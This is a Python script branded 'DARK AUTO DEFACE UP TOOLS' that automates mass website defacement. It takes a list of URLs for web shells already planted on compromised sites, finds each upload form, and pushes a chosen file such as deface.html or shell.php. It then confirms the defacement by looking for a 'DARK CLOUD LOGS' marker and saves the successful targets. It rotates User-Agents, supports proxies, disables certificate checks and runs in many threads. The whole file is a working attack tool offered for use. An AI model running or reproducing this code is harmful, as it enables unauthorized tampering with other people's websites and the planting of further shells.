import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import random
import time
from tqdm import tqdm
import sys

# Color codes
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Optional Proxy
PROXIES = {
    # "http": "http://127.0.0.1:8080",
    # "https": "http://127.0.0.1:8080"
}

def banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""{BOLD}{CYAN}
           🌎 WELCOME TO DARK TOOLS 💀
    
{RED}
      ██████╗░░█████╗░██████╗░██╗░░██╗
      ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
      ██║░░██║███████║██████╔╝█████═╝░
      ██║░░██║██╔══██║██╔══██╗██╔═██╗░
      ██████╔╝██║░░██║██║░░██║██║░╚██╗
      ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝  
{RED}║{YELLOW}      TOOLS CREATED BY DARK CLOUD LOGS {RED}       ║
{RED}╚══════════════════════════════════════════════╝
{MAGENTA}          DARK AUTO DEFACE UP TOOLS
{CYAN}            OWNER  : DARK_CLOUD_LOGS_BOT
    
{GREEN}═══════════════════════════════════════════════
{RESET}""")


def get_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }


def detect_file_input_name(url):
    """Detect file input field name in forms"""
    try:
        headers = get_headers()
        response = requests.get(url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
        response.raise_for_status()
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for forms with file upload capability
        forms = soup.find_all('form')
        for form in forms:
            # Check if form has file upload capability
            if form.get('enctype') == 'multipart/form-data' or 'upload' in str(form).lower():
                file_input = form.find('input', {'type': 'file'})
                if file_input and file_input.get('name'):
                    return file_input.get('name')
            
            # Also check for any file input in the form
            file_input = form.find('input', {'type': 'file'})
            if file_input and file_input.get('name'):
                return file_input.get('name')
        
        # If no form found, look for any file input on the page
        file_input = soup.find('input', {'type': 'file'})
        if file_input and file_input.get('name'):
            return file_input.get('name')
            
    except requests.exceptions.RequestException:
        return None
    except Exception:
        return None
    
    return None


def upload_file(shell_url, file_path, input_name, file_name_only):
    """Upload file to the target shell"""
    try:
        headers = get_headers()
        
        with open(file_path, 'rb') as file:
            files = {input_name: (file_name_only, file, 'application/octet-stream')}
            data = {}
            
            # Try to find additional form data that might be required
            try:
                response = requests.get(shell_url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
                soup = BeautifulSoup(response.text, 'html.parser')
                form = soup.find('form')
                if form:
                    inputs = form.find_all('input')
                    for inp in inputs:
                        if inp.get('type') in ['hidden', 'text'] and inp.get('name'):
                            data[inp.get('name')] = inp.get('value', '')
            except:
                pass
            
            response = requests.post(
                shell_url, 
                files=files, 
                data=data,
                headers=headers, 
                proxies=PROXIES, 
                timeout=20, 
                verify=False
            )
            
            return response.status_code in [200, 201, 202]
            
    except Exception:
        return False


def check_uploaded_file_direct(shell_url, file_name):
    """Check uploaded file by directly accessing it with the filename appended to the URL"""
    try:
        parsed = urlparse(shell_url)
        
        # Get the base directory of the shell
        shell_directory = os.path.dirname(parsed.path)
        if shell_directory == '':
            shell_directory = '/'
        
        # Construct possible direct URLs for the uploaded file
        possible_urls = [
            # Same directory as shell
            f"{parsed.scheme}://{parsed.netloc}{shell_directory}/{file_name}",
            # Root directory
            f"{parsed.scheme}://{parsed.netloc}/{file_name}",
            # Uploads directory
            f"{parsed.scheme}://{parsed.netloc}{shell_directory}/uploads/{file_name}",
            f"{parsed.scheme}://{parsed.netloc}/uploads/{file_name}",
            # Current directory if shell is in subfolder
            f"{parsed.scheme}://{parsed.netloc}{parsed.path}/{file_name}" if parsed.path else f"{parsed.scheme}://{parsed.netloc}/{file_name}",
        ]
        
        # Remove duplicate URLs
        possible_urls = list(set(possible_urls))
        
        headers = get_headers()
        
        for test_url in possible_urls:
            try:
                response = requests.get(test_url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
                
                if response.status_code == 200:
                    # Check if the response contains our defacement content
                    response_text = response.text.upper()
                    
                    # Check for DARK CLOUD LOGSin title or page content
                    if "DARK CLOUD LOGS" in response_text:
                        return test_url
                    
            except:
                continue
        
        # If no direct access found, try to check if the original page content changed
        try:
            original_response = requests.get(shell_url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
            if "DARK CLOUD LOGS" in original_response.text.upper():
                return shell_url
        except:
            pass
            
    except Exception:
        return None
    
    return None


def save_successful_url(url):
    """Save successful URL to file immediately"""
    try:
        with open('successful.txt', 'a', encoding='utf-8') as sf:
            sf.write(url + '\n')
        return True
    except Exception:
        return False


def process_shell(shell):
    """Process a single shell URL"""
    try:
        # Validate URL format
        if not shell.startswith(('http://', 'https://')):
            shell = 'http://' + shell
        
        # Step 1: Detect file input field
        input_name = detect_file_input_name(shell)
        
        if not input_name:
            return False, None
        
        # Step 2: Upload the file
        upload_success = upload_file(shell, upload_file_path, input_name, file_name_only)
        
        if not upload_success:
            return False, None
        
        # Step 3: Check if file is accessible directly and contains DARK CLOUD LOGS
        uploaded_url = check_uploaded_file_direct(shell, file_name_only)
        
        if uploaded_url:
            # Final verification - check if DARK CLOUD LOGSis present
            try:
                headers = get_headers()
                response = requests.get(uploaded_url, headers=headers, proxies=PROXIES, timeout=20, verify=False)
                if response.status_code == 200 and "DARK CLOUD LOGS" in response.text.upper():
                    # Save immediately and return
                    save_successful_url(uploaded_url)
                    return True, uploaded_url
            except:
                return False, None
                
    except Exception:
        return False, None
    
    return False, None


def main():
    global file_name_only, upload_file_path
    
    banner()
    
    # Get input files
    shell_file = input(f"{BLUE}[?] Shell list file (e.g., shells.txt): {RESET}").strip()
    upload_file_path = input(f"{YELLOW}[?] Enter file  (e.g., {GREEN}deface.html/shell.php {RESET} ): {RESET}").strip()
    
    # Get max workers
    try:
        max_workers = int(input(f"{YELLOW}[?] Max workers (default 20): {RESET}").strip() or "20")
    except:
        max_workers = 30
    
    # Validate input files
    if not os.path.exists(shell_file):
        print(f"{RED}[✗] Shell list file not found: {shell_file}{RESET}")
        return
    
    if not os.path.exists(upload_file_path):
        print(f"{RED}[✗] Upload file not found: {upload_file_path}{RESET}")
        return
    
    file_name_only = os.path.basename(upload_file_path)
    
    # Read shell URLs
    try:
        with open(shell_file, 'r', encoding='utf-8') as f:
            shells = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}[✗] Error reading shell file: {e}{RESET}")
        return
    
    if not shells:
        print(f"{RED}[✗] No valid URLs found in {shell_file}{RESET}")
        return
    
    # Initialize successful.txt file
    open('successful.txt', 'w').close()
    
    print(f"{BLUE}[i] Total targets loaded: {len(shells)}{RESET}")
    print(f"{BLUE}[i] Upload file: {file_name_only}{RESET}")
    print(f"{BLUE}[i] Max workers: {max_workers}{RESET}")
    print(f"{YELLOW}[*] Starting automated defacement process...{RESET}")
    print(f"{CYAN}[i] Only URLs with 'DARK CLOUD LOGS' will be shown as successful{RESET}")
    print(f"{CYAN}[i] Successful URLs are saved in real-time to successful.txt{RESET}\n")
    
    # Initialize counters
    success_count = 0
    
    # Process shells with progress bar
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_shell = {executor.submit(process_shell, shell): shell for shell in shells}
        
        for future in tqdm(as_completed(future_to_shell), total=len(shells), desc="Defacing"):
            shell = future_to_shell[future]
            try:
                success, url = future.result()
                if success:
                    success_count += 1
                    print(f"{GREEN}[✓] SUCCESS: {url}{RESET}")
            except Exception:
                pass
    
    # Print summary
    print(f"\n{GREEN}═══════════════════════════════════════════════{RESET}")
    print(f"{GREEN}[✓] PROCESS COMPLETED!{RESET}")
    print(f"{GREEN}[✓] Successfully defaced: {success_count}{RESET}")
    print(f"{RED}[✗] Failed: {len(shells) - success_count}{RESET}")
    print(f"{BLUE}[i] Total targets: {len(shells)}{RESET}")
    print(f"{BLUE}[i] Max workers used: {max_workers}{RESET}")
    
    if success_count > 0:
        print(f"{GREEN}[✓] Successful URLs saved in: successful.txt{RESET}")
        print(f"{GREEN}[✓] Total saved: {success_count}{RESET}")
    else:
        print(f"{YELLOW}[!] No successful defacements found{RESET}")


if __name__ == '__main__':
    try:
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Process interrupted by user{RESET}")
    except Exception as e:
        print(f"{RED}[!] Unexpected error: {e}{RESET}")